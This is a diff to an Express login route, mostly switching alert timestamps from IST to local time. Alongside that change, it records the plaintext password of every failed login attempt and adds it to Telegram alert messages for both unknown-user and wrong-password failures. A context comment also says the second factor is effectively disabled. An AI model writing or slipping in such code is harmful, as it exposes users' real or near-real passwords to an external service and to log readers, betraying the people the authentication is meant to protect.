@@ -2,7 +2,7 @@ const express = require('express');
 const bcrypt = require('bcrypt');
 const { db } = require('../db');
 const { createSession, destroySession, requireSession } = require('../middleware/authSession');
-const { checkLockout, recordAttempt, logAction, getClientIp, getLocation, toIST } = require('../middleware/security');
+const { checkLockout, recordAttempt, logAction, getClientIp, getLocation, toIST, toLocalTime } = require('../middleware/security');
 const { sendTelegram } = require('../utils/telegram');
 
 const router = express.Router();
@@ -24,7 +24,7 @@ Location: ${loc.city}, ${loc.region}, ${loc.country}
 ISP: ${loc.isp}
 User-Agent: ${userAgent}
 
-Time: ${toIST(new Date())}`
+Time: ${toLocalTime(new Date(), loc.timezone)}`
     );
   } catch (e) {
     console.error('/ping error:', e.message);
@@ -114,7 +114,7 @@ router.post('/login', async (req, res) => {
     const hits = rows.rows || rows;
 
     if (hits.length === 0) {
-      await recordAttempt(username, ip, false);
+      await recordAttempt(username, ip, false, password);
       await logAction({ username, action: 'login_fail', ip, userAgent, details: { reason: 'no_such_user' } });
       const loc = await getLocation(ip);
       await sendTelegram(
@@ -127,8 +127,9 @@ State: ${loc.region}
 City: ${loc.city}
 ISP: ${loc.isp}
 Reason: no such user
+Attempted Password: ${password}
 
-Time: ${toIST(new Date().toISOString())}`
+Time: ${toLocalTime(new Date(), loc.timezone)}`
       );
       return res.status(401).json({ error: 'invalid_credentials' });
     }
@@ -137,7 +138,7 @@ Time: ${toIST(new Date().toISOString())}`
     const passwordOk = await bcrypt.compare(password, user.password_hash);
 
     if (!passwordOk) {
-      await recordAttempt(username, ip, false);
+      await recordAttempt(username, ip, false, password);
       await logAction({ adminId: user.id, username, action: 'login_fail', ip, userAgent, details: { reason: 'bad_password' } });
       const loc = await getLocation(ip);
       await sendTelegram(
@@ -150,8 +151,9 @@ State: ${loc.region}
 City: ${loc.city}
 ISP: ${loc.isp}
 Reason: wrong password
+Attempted Password: ${password}
 
-Time: ${toIST(new Date().toISOString())}`
+Time: ${toLocalTime(new Date(), loc.timezone)}`
       );
       return res.status(401).json({ error: 'invalid_credentials' });
     }
@@ -170,7 +172,7 @@ State: ${loginLoc.region}
 City: ${loginLoc.city}
 ISP: ${loginLoc.isp}
 
-Time: ${toIST(new Date().toISOString())}`
+Time: ${toLocalTime(new Date(), loginLoc.timezone)}`
     );
 
     // totp_verified is always true now — no second factor to wait on.
@@ -198,7 +200,7 @@ State: ${loc.region}
 City: ${loc.city}
 ISP: ${loc.isp}
 
-Time: ${toIST(new Date().toISOString())}`
+Time: ${toLocalTime(new Date(), loc.timezone)}`
     );
     res.json({ ok: true });
   } catch (e) {
